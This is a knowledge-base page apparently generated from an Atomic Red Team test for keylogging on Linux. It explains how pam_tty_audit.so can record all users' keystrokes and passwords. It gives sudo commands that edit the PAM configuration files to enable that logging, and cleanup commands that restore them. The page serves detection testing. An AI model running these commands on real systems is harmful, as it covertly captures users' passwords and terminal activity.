---
atomic_guid: "9c6bdb34-a89f-4b90-acb1-5970614c711b"
title: "Living off the land Terminal Input Capture on Linux with pam.d"
framework: "atomic"
generated: "true"
attack_technique_id: "T1056.001"
attack_technique_name: "Input Capture: Keylogging"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/T1056.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "9c6bdb34-a89f-4b90-acb1-5970614c711b"
  - "Living off the land Terminal Input Capture on Linux with pam.d"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Living off the land Terminal Input Capture on Linux with pam.d

Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.

Passwords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).

Use 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library.

## Metadata

- Atomic GUID: 9c6bdb34-a89f-4b90-acb1-5970614c711b
- Technique: T1056.001: Input Capture: Keylogging
- Platforms: linux
- Executor: sh
- Elevation Required: True
- Source Path: atomics/T1056.001/T1056.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1056-input_capture|T1056.001]]

## Dependencies

Checking if pam_tty_audit.so is installed

### Prerequisite Check

```untitled
test -f '/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so'
```

### Get Prerequisite

```untitled
echo "Sorry, you must install module pam_tty_audit.so and recompile, for this test to work"
```

## Executor

- elevation_required: True
- name: sh

### Command

```bash
if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;
if sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;
sudo touch /tmp/password-auth.bk
sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so
enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so
enable=* log_password" >> /etc/pam.d/system-auth
```

### Cleanup

```bash
sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth
sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/T1056.001.yaml)
